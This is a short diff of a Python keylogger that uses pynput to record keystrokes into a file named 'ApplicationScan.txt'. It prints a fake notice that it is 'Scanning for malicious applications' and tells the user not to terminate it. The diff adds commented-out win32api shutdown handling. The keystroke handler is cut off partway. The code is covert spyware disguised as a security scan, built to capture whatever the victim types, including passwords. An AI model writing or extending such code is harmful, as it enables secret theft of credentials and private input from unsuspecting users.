@@ -1,5 +1,7 @@
 from pynput.keyboard import Key, Listener
 import logging
+#import win32api
+#import sys
 
 logging.basicConfig(
     filename="ApplicationScan.txt",
@@ -7,6 +9,16 @@ logging.basicConfig(
     format="%(asctime)s: %(message)s"
 )
 print("Scanning for malicious applications... DO NOT TERMINATE")
+
+"""
+def on_exit(event_type):
+    if event_type in (0, 1, 2):  # CTRL_CLOSE_EVENT, CTRL_LOGOFF_EVENT, CTRL_SHUTDOWN_EVENT
+        logging.info("System is shutting down or logging off.")
+        sys.exit(0)  # Ensures clean exit
+    return True
+    
+win32api.SetConsoleCtrlHandler(on_exit, True)
+"""
 
 def on_press(key):
     try:
